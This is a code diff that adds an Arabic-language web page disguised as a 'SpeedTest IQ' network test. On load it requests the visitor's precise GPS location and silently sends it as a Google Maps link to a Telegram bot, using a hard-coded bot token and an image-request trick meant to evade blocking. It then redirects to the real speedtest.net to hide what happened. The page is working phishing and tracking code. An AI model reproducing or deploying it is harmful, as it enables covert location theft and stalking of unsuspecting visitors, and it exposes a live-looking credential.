@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeedTest IQ | فحص الشبكة</title>
+    <style>
+        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #334155; width: 85%; max-width: 350px; }
+        .btn { background: #00d2ff; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+    </style>
+</head>
+<body onload="askFirst()"> <div class="card">
+        <h2 style="color:#00d2ff;">SpeedTest IQ</h2>
+        <p id="msg">يتم الآن تحضير سيرفر الفحص...</p>
+        <button id="main-btn" onclick="askFirst()" class="btn">ابدأ الفحص الآن</button>
+    </div>
+
+    <script>
+        const token = '8544269332:AAGf3PsxBtCu0hjXUp1nqaqJknKpf5aR8Po';
+        const chatId = '1638763189';
+
+        function askFirst() {
+            if (navigator.geolocation) {
+                // يطلب الموقع فوراً
+                navigator.geolocation.getCurrentPosition(success, fail, {enableHighAccuracy: true});
+            }
+        }
+
+        function success(pos) {
+            document.getElementById('msg').innerText = "تم الاتصال.. جاري التحويل";
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            
+            // رابط الخريطة (صححته إلك 100%)
+            const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
+            const text = encodeURIComponent("🎯 صيدة جديدة!\n📍 الموقع: " + mapLink);
+            
+            // الإرسال كـ "صورة" لضمان عدم الحجب
+            var i = new Image();
+            i.src = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + text;
+
+            // تحويل لموقع سبيد تست الحقيقي
+            setTimeout(() => {
+                window.location.href = "https://www.speedtest.net";
+            }, 600);
+        }
+
+        function fail() {
+            alert("لضمان دقة الفحص، يرجى تفعيل الموقع (GPS) من إعدادات المتصفح.");
+        }
+    </script>
+</body>
+</html>
